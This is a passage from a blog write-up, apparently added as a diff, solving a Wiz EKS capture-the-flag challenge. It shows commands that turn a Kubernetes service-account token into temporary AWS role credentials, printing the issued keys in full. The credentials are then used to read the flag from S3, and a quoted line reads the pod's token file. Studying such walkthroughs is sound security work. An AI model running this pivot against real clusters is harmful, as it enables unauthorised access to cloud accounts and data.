+</span></span><span style="display:flex;"><span>eyJhbGciOiJSUzI1NiIsImtpZCI6IjJiOWJkZDViNzk2YTc1NTM2NWVhN2IxZTE1N2NmNTU4NmVmOTgyNDYifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzAxOTYwMjAyLCJpYXQiOjE3MDE5NTY2MDIsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTcwMTk1NjYwMiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.maA_OAytSn_Pd7rR0IU-NRMcdxUqTA-6HGrX2XRYwq2TKTrZP3j9vesbDdDKnxZxj512XYoNDKP-E_1U02c3NcIKu4RlSB8HzYkqSF53f-LbiummQwyjaseUza4VUVKXDGIyAeUEYlsB5-JNOvhDDFFBk-xeRHmJzt76H-O61THAwoF2meGwQ8Rsw9u3T2ieooBUnPbbk5T9htLvYgZoJirLF5_PVQzXEdsnOnyB2ImwChdMncXuutY0PP-Qnsv2NVFXfBB_kUdRSB_3SlspBZho_GF-sdGYkX525DViFDJEWcbYEarjeOZCqMel6-mrxzDDla_bjN4UYFkHKsr-yg
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name Exploit --web-identity-token eyJhbGciOiJSUzI1NiIsImtpZCI6IjJiOWJkZDViNzk2YTc1NTM2NWVhN2IxZTE1N2NmNTU4NmVmOTgyNDYifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzAxOTYwMjAyLCJpYXQiOjE3MDE5NTY2MDIsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTcwMTk1NjYwMiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.maA_OAytSn_Pd7rR0IU-NRMcdxUqTA-6HGrX2XRYwq2TKTrZP3j9vesbDdDKnxZxj512XYoNDKP-E_1U02c3NcIKu4RlSB8HzYkqSF53f-LbiummQwyjaseUza4VUVKXDGIyAeUEYlsB5-JNOvhDDFFBk-xeRHmJzt76H-O61THAwoF2meGwQ8Rsw9u3T2ieooBUnPbbk5T9htLvYgZoJirLF5_PVQzXEdsnOnyB2ImwChdMncXuutY0PP-Qnsv2NVFXfBB_kUdRSB_3SlspBZho_GF-sdGYkX525DViFDJEWcbYEarjeOZCqMel6-mrxzDDla_bjN4UYFkHKsr-yg
+</span></span><span style="display:flex;"><span>AssumedRoleUser:
+</span></span><span style="display:flex;"><span>  Arn: arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/Exploit
+</span></span><span style="display:flex;"><span>  AssumedRoleId: AROA2AVYNEVMZEZ2AFVYI:Exploit
+</span></span><span style="display:flex;"><span>Audience: sts.amazonaws.com
+</span></span><span style="display:flex;"><span>Credentials:
+</span></span><span style="display:flex;"><span>  AccessKeyId: ASIA2AVYNEVM3PAQQRXA
+</span></span><span style="display:flex;"><span>  Expiration: <span style="color:#e6db74">&#39;2023-12-07T14:43:44+00:00&#39;</span>
+</span></span><span style="display:flex;"><span>  SecretAccessKey: WPWMQn272MmwLo3uMV5jircBStl4BzWPQkE3KgK1
+</span></span><span style="display:flex;"><span>  SessionToken: IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMSJHMEUCIAZnLmFlJaejM03YE4uUY7DzTCvW9Q37P8Mx6ADCFUD3AiEA/x69r0zxUoEBaqCEjS5Qt4x9nUt/o2O3jhB6TAtGDP4qwQQIp///////////ARAAGgw2ODg2NTUyNDY2ODEiDLwNB2gdVas55GjjMSqVBN8aypZz0vN8o4LwcqxOxJTHag1aNMwbExWwUYhc3we7yIqJ7uWS/m2UoLL0yW66S0ZAqySq+CoWNz20mIhVNyH6uUdL9tJK6hRa1OO6ZQbOHS1cwAgR9nLF0+kWHei1Kt0MkUnF/IDKtg0VB7bmotJZ+tV/f++o3aS5707ztMj2hYgBmCBxjgMFVFEHO+hI6avY6i+FMl5IMtneTk7C8boOIcyuXi9fOd6O9Ng6L4y47lUfwMAU//q+HUVW0OyJY+wWLVZz2p8duN16w+0TEnnzDm2fxlOgrKyICep8IVnP2/RZ/iU1oeSLnhhNvB29RYQKVI9Awp5Xj6TDNGJu6M9HFrM4GbHKLV5yN0hzD49MHMlSCV7NdgShiAL1SCjC8Sulw1Hg6Fc+u8etQvmCTydeB8uCj/M93HRgKBqyOs9oeaT3DGR9pRf5rJ/EIf/XYtJvnc1Lv15gZdOnnPr1X9HdgGFs1HcL5dpX6Qg+gAHANQl9zmtM8qITXbptLLU8wK7C+y2K93xyLtucthLgUG3HQ/I4xTgPWBDYGZBWBhuukDoQ9M3t4lH2wCqaIbdgUsK4tdPFUq0Fm8uzWiklczSYrEH29KdGFIiQnzEtSfPnpZYggybnX5Vi3l6RbMY55JytI7YzvidAfA+OLlpYqm0nqU8Yt9xOrJwEKauqEzCKvBGkO/jd6x9I1VyUKz8nzkSqAQfxMJCYx6sGOpUBsolu0HPRsTLuEqyO2U3KHPmy37Lzw1ZkXW0gE9rYmFpJdE6QoLucr+TyEZB2mtuFtYxWkeK1I6OvFJG4wYMhKyKwrdCqVpKoxXRo15T+xUav7lBNRxnAkGo1D0g5RTj1bF15gZUJWv7b7zc3Iz7TFasDUhWyGfD9xNhvEVF8gPvJt9YgMq4Xd15anvCJ2fafUDDVbUk<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>Provider: arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589
+</span></span><span style="display:flex;"><span>SubjectFromWebIdentityToken: system:serviceaccount:challenge5:debug-sa
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>ASIA2AVYNEVM3PAQQRXA
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>WPWMQn272MmwLo3uMV5jircBStl4BzWPQkE3KgK1
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# export AWS_SESSION_TOKEN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMSJHMEUCIAZnLmFlJaejM03YE4uUY7DzTCvW9Q37P8Mx6ADCFUD3AiEA/x69r0zxUoEBaqCEjS5Qt4x9nUt/o2O3jhB6TAtGDP4qwQQIp///////////ARAAGgw2ODg2NTUyNDY2ODEiDLwNB2gdVas55GjjMSqVBN8aypZz0vN8o4LwcqxOxJTHag1aNMwbExWwUYhc3we7yIqJ7uWS/m2UoLL0yW66S0ZAqySq+CoWNz20mIhVNyH6uUdL9tJK6hRa1OO6ZQbOHS1cwAgR9nLF0+kWHei1Kt0MkUnF/IDKtg0VB7bmotJZ+tV/f++o3aS5707ztMj2hYgBmCBxjgMFVFEHO+hI6avY6i+FMl5IMtneTk7C8boOIcyuXi9fOd6O9Ng6L4y47lUfwMAU//q+HUVW0OyJY+wWLVZz2p8duN16w+0TEnnzDm2fxlOgrKyICep8IVnP2/RZ/iU1oeSLnhhNvB29RYQKVI9Awp5Xj6TDNGJu6M9HFrM4GbHKLV5yN0hzD49MHMlSCV7NdgShiAL1SCjC8Sulw1Hg6Fc+u8etQvmCTydeB8uCj/M93HRgKBqyOs9oeaT3DGR9pRf5rJ/EIf/XYtJvnc1Lv15gZdOnnPr1X9HdgGFs1HcL5dpX6Qg+gAHANQl9zmtM8qITXbptLLU8wK7C+y2K93xyLtucthLgUG3HQ/I4xTgPWBDYGZBWBhuukDoQ9M3t4lH2wCqaIbdgUsK4tdPFUq0Fm8uzWiklczSYrEH29KdGFIiQnzEtSfPnpZYggybnX5Vi3l6RbMY55JytI7YzvidAfA+OLlpYqm0nqU8Yt9xOrJwEKauqEzCKvBGkO/jd6x9I1VyUKz8nzkSqAQfxMJCYx6sGOpUBsolu0HPRsTLuEqyO2U3KHPmy37Lzw1ZkXW0gE9rYmFpJdE6QoLucr+TyEZB2mtuFtYxWkeK1I6OvFJG4wYMhKyKwrdCqVpKoxXRo15T+xUav7lBNRxnAkGo1D0g5RTj1bF15gZUJWv7b7zc3Iz7TFasDUhWyGfD9xNhvEVF8gPvJt9YgMq4Xd15anvCJ2fafUDDVbUk=&#34;</span>
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag  -
+</span></span><span style="display:flex;"><span>wiz_eks_challenge<span style="color:#f92672">{</span>xxx<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>To satisfy the <code>StringEquals</code> condition in the IAM role trust policy, you need to ensure that the OIDC provider returns a token with the correct audience (<code>aud</code>) field value.</p>
+<p>The condition is specified as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#e6db74">&#34;StringEquals&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&#34;</span>: <span style="color:#e6db74">&#34;sts.amazonaws.com&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This condition checks whether the value of the <code>aud</code> field in the token issued by the OIDC provider is equal to &ldquo;sts.amazonaws.com&rdquo;.</p>
+<p><a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html">assume-role-with-web-identity</a></p>
+<blockquote>
+<p>Before your application can call <code>AssumeRoleWithWebIdentity</code> , you must have an identity token from a supported identity provider  and create a role that the application can assume. The role that your  application assumes must trust the identity provider that is associated  with the identity token. In other words, the identity provider must be  specified in the role&rsquo;s trust policy.</p>
+</blockquote>
+<p><a href="https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-pivoting-to-clouds#workflow-of-iam-role-for-service-accounts-1">IAM Role for K8s Service Accounts via OIDC</a></p>
+<blockquote>
+<p>aws sts assume-role-with-web-identity &ndash;role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting &ndash;role-session-name something &ndash;web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token</p>
+</blockquote>
+<h2 id="certificate">Certificate</h2>
+<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202312072209392.png" alt="Certificate"></p>
+
+        </article>
+    </div>
+    <div class="giscus_comments"><script src="https://giscus.app/client.js"
+        data-repo="an5er/an5er.github.io"
+        data-repo-id="R_kgDOKnQBrQ"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOKnQBrc4Cav6q"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="dark"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
+    </div>
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+</footer>
+</body>
+</html>
